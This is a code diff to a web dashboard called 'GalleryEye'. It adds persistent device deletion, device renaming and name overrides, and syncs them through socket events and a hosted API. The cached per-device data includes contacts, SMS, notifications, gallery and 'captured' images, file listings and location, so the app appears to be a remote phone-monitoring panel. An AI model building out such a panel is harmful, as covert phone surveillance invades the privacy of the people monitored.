@@ -297,55 +297,120 @@ export default function Home({ initialTool = null }: HomeProps = {}) {
     const [deviceToast, setDeviceToast] = useState<{ name: string; message: string } | null>(null);
     const notifiedDevicesRef = useRef<Set<string>>(new Set());
     const deletedDevicesRef = useRef<Set<string>>(new Set());
+
+    // Load permanently deleted devices from localStorage on client init
+    useEffect(() => {
+        if (typeof window !== 'undefined') {
+            try {
+                const stored = localStorage.getItem('galleryeye_deleted_devices');
+                if (stored) {
+                    const parsed = JSON.parse(stored);
+                    if (Array.isArray(parsed)) {
+                        parsed.forEach(id => deletedDevicesRef.current.add(String(id)));
+                    }
+                }
+            } catch {}
+        }
+    }, []);
+
     const previousOnlineStateRef = useRef<Map<string, boolean>>(new Map());
     const lastOnlineToastTimeRef = useRef<Map<string, number>>(new Map());
     const isInitialDeviceSyncRef = useRef<boolean>(true);
 
     const handleDeleteDevice = async (deviceIds: string | string[], skipConfirm?: boolean) => {
-        if (!session?.user?.uuid) return;
-        const ids = Array.isArray(deviceIds) ? deviceIds : [deviceIds];
+        const ids = (Array.isArray(deviceIds) ? deviceIds : [deviceIds]).filter(Boolean).map(String);
+        if (ids.length === 0) return;
+
         if (!skipConfirm) {
             if (!confirm(`Are you sure you want to delete ${ids.length} device(s)? This cannot be undone.`)) return;
         }
         
-        // Immediately record in deletedDevicesRef and remove from local UI state for instant, permanent deletion response
+        const uuid = session?.user?.uuid || (session?.user as any)?.id || (typeof window !== 'undefined' ? localStorage.getItem('galleryeye_last_uuid') : '') || '';
+
+        // Immediately record in deletedDevicesRef and localStorage for permanent deletion response
         ids.forEach(id => {
             deletedDevicesRef.current.add(id);
             notifiedDevicesRef.current.delete(id);
             try {
-                const uuid = session.user.uuid;
-                localStorage.removeItem(`galleryeye_contacts_${uuid}_${id}`);
-                localStorage.removeItem(`galleryeye_sms_${uuid}_${id}`);
-                localStorage.removeItem(`galleryeye_notifications_${uuid}_${id}`);
-                localStorage.removeItem(`gallery_images_${uuid}_${id}`);
-                localStorage.removeItem(`gallery_captured_${uuid}_${id}`);
-                localStorage.removeItem(`fm_cache_${uuid}_${id}`);
-                localStorage.removeItem(`loc_${id}`);
+                localStorage.removeItem(`dev_name_${id}`);
+                if (uuid) {
+                    localStorage.removeItem(`galleryeye_contacts_${uuid}_${id}`);
+                    localStorage.removeItem(`galleryeye_sms_${uuid}_${id}`);
+                    localStorage.removeItem(`galleryeye_notifications_${uuid}_${id}`);
+                    localStorage.removeItem(`gallery_images_${uuid}_${id}`);
+                    localStorage.removeItem(`gallery_captured_${uuid}_${id}`);
+                    localStorage.removeItem(`fm_cache_${uuid}_${id}`);
+                    localStorage.removeItem(`loc_${id}`);
+                }
             } catch {}
         });
+
+        try {
+            localStorage.setItem('galleryeye_deleted_devices', JSON.stringify(Array.from(deletedDevicesRef.current)));
+        } catch {}
+
+        // Remove from local UI state immediately
         setDevices(prev => prev.filter(d => {
-            const devId = d.deviceId || d.id || d._id;
-            return !ids.includes(devId) && !ids.includes(d.deviceId) && !ids.includes(d.id);
+            const devId = String(d.deviceId || d.id || d._id);
+            return !ids.includes(devId) && !ids.includes(String(d.deviceId)) && !ids.includes(String(d.id));
         }));
-        if (selectedDeviceId && ids.includes(selectedDeviceId)) {
+
+        if (selectedDeviceId && ids.includes(String(selectedDeviceId))) {
             setSelectedDeviceId(null);
-            localStorage.removeItem('selectedDeviceId');
+            try { localStorage.removeItem('selectedDeviceId'); } catch {}
         }
 
+        // Send deletion request to server
         for (const deviceId of ids) {
             try {
-                if (socket) {
-                    socket.emit('delete_device', { uuid: session.user.uuid, deviceId, id: deviceId });
-                    socket.emit('remove_device', { uuid: session.user.uuid, deviceId, id: deviceId });
+                if (socket && uuid) {
+                    socket.emit('delete_device', { uuid, deviceId, id: deviceId });
+                    socket.emit('remove_device', { uuid, deviceId, id: deviceId });
                 }
-                await fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/devices/delete', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ uuid: session.user.uuid, deviceId, id: deviceId, _id: deviceId })
-                });
+                if (uuid) {
+                    fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/devices/delete', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ uuid, deviceId, id: deviceId, _id: deviceId })
+                    }).catch(() => {});
+                }
             } catch (error) {
                 console.error('Failed to delete device on server:', error);
             }
+        }
+    };
+
+    const handleRenameDevice = (deviceId: string, newName: string) => {
+        if (!deviceId) return;
+        const cleanName = newName.trim();
+        const uuid = session?.user?.uuid || (session?.user as any)?.id || (typeof window !== 'undefined' ? localStorage.getItem('galleryeye_last_uuid') : '') || '';
+
+        try {
+            if (cleanName) {
+                localStorage.setItem(`dev_name_${deviceId}`, cleanName);
+            } else {
+                localStorage.removeItem(`dev_name_${deviceId}`);
+            }
+        } catch {}
+
+        // Update local state immediately
+        setDevices(prev => prev.map(d => {
+            const devId = String(d.deviceId || d.id || d._id);
+            if (devId === String(deviceId)) {
+                return { ...d, name: cleanName || d.model || d.deviceName || 'Android Device' };
+            }
+            return d;
+        }));
+
+        if (socket && uuid) {
+            socket.emit('rename_device', { uuid, deviceId, name: cleanName });
+        }
+        if (uuid) {
+            fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/devices/rename', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ uuid, deviceId, name: cleanName })
+            }).catch(() => {});
         }
     };
 
@@ -671,10 +736,21 @@ export default function Home({ initialTool = null }: HomeProps = {}) {
 
             socket.on("device_list_update", (deviceList: any[]) => {
                 const filteredList = Array.isArray(deviceList) ? deviceList.filter(d => {
-                    const devId = d.deviceId || d.id || d._id;
-                    return devId && !deletedDevicesRef.current.has(devId);
+                    const devId = String(d.deviceId || d.id || d._id || '');
+                    return devId && !deletedDevicesRef.current.has(devId) && !deletedDevicesRef.current.has(String(d.deviceId)) && !deletedDevicesRef.current.has(String(d.id));
                 }) : [];
-                setDevices(filteredList);
+
+                const enhancedList = filteredList.map(d => {
+                    const devId = String(d.deviceId || d.id || d._id || '');
+                    if (typeof window !== 'undefined') {
+                        const custom = localStorage.getItem(`dev_name_${devId}`);
+                        if (custom && custom.trim()) {
+                            return { ...d, name: custom.trim() };
+                        }
+                    }
+                    return d;
+                });
+                setDevices(enhancedList);
 
                 filteredList.forEach(d => {
                     const devId = d.deviceId || d.id || d._id;
@@ -2356,6 +2432,7 @@ END:VCARD`;
                 handleSignOut={handleSignOut}
                 onOpenAppModal={() => setShowAppModal(true)}
                 onDeleteDevice={handleDeleteDevice}
+                onRenameDevice={handleRenameDevice}
                 user={session?.user}
                 openDropdownProp={navDropdown}
                 setOpenDropdownProp={setNavDropdown}
